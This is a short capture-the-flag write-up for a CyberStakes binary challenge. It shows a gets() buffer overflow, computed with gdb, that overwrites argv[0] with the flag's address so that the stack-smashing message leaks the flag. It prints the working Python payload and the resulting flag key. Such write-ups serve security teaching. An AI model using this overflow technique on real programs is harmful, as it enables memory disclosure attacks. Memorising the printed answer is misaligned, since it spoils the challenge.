## ARGV[0] [110]

## Solution
Using `gdb` to examine the stack after the call to `gets()`, we can see that `argv[0]` is at address `0xffffcf94` and the start of the buffer read in from `gets()` is at `0xffffce9c`. This means that you must pad `0xffffcf94` - `0xffffce9c` = `0xf8` = 248 bytes to overwrite `argv[0]` with the address of `flag`, which is read in from an absolute path `/home/problems/a3cd0963ad6889bdf9863ee46fca32f0/argv-0-_8/flag.txt` on the CyberStakes server to `.data` address `0x0804a080`:
```
ameise@shell:~$ cd /home/problems/a3cd0963ad6889bdf9863ee46fca32f0/argv-0-_8
ameise@shell:/home/problems/a3cd0963ad6889bdf9863ee46fca32f0/argv-0-_8$ ls
argv0  flag.txt
ameise@shell:/home/problems/a3cd0963ad6889bdf9863ee46fca32f0/argv-0-_8$ python -c 'print "a"*248 + "\x80\xa0\x04\x08"' | ./argv0 
The contents of the file are in memory. Can you leak them?
*** stack smashing detected ***: 0fd5c4f2abcc7c48534f0fc395629f89 terminated
Aborted
```

The key is `0fd5c4f2abcc7c48534f0fc395629f89`.